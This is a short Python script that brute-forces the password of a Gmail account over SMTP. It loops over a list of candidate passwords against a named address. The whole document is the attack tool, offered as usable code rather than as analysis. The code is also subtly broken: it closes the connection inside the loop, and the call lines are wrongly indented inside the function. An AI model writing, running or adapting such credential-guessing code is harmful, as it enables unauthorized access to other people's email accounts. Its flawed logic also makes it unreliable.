import smtplib
def bruteforce_email_password(email, password_list):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    for password in password_list:
        try:
            server.login(email, password)
            print(f"Password found: {password}")
            break
        except smtplib.SMTPAuthenticationError:
            print(f"password incorrect: {password}")
            server.quit()

    email = 'parody434@gmail.com'
    password_list = ['Wagwaan1234','','']
    bruteforce_email_password(email, password_list)